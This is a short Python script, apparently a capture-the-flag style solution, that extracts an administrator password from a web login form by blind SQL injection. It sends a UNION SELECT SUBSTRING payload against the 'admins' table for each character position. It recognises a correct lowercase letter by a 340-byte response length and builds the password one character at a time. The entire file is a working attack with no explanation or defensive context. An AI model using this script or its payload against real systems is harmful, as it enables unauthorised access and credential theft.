import requests
import string
import sys

print("starting...")

base=""

url = sys.argv[1]

c=1

def bf():
    global base
    global c
    payload='username=aaa%27+union+select+substring%28password %2C{}%2C1%29 from admins-- &password='.format(str(c))
    print(payload)
    for i in string.ascii_lowercase:
        r=requests.post(url, data=bytes(payload, 'utf-8')+bytes(i, 'utf-8'), headers={"Content-Type":"application/x-www-form-urlencoded"})
        if len(r.content) == 340:
            base+=i
            c+=1
            print(base)
            bf()

bf()